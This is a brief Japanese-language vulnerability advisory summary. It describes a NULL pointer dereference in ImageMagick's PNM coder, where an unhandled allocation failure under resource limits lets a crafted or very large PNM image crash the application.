summary: ImageMagick 7.1.2-31より前および6.9.13-56より前のバージョンには、PNMコーダーにNULLポインタ参照の脆弱性があります。処理の特定のポイントでメモリ（リソース）制限に達した際に割り当て失敗が適切に処理されず、その結果NULLポインタが参照されます。これにより、特別に細工されたまたは十分に大きなPNM画像を処理すると、サービス拒否（アプリケーションのクラッシュ）を引き起こす可能性があります。
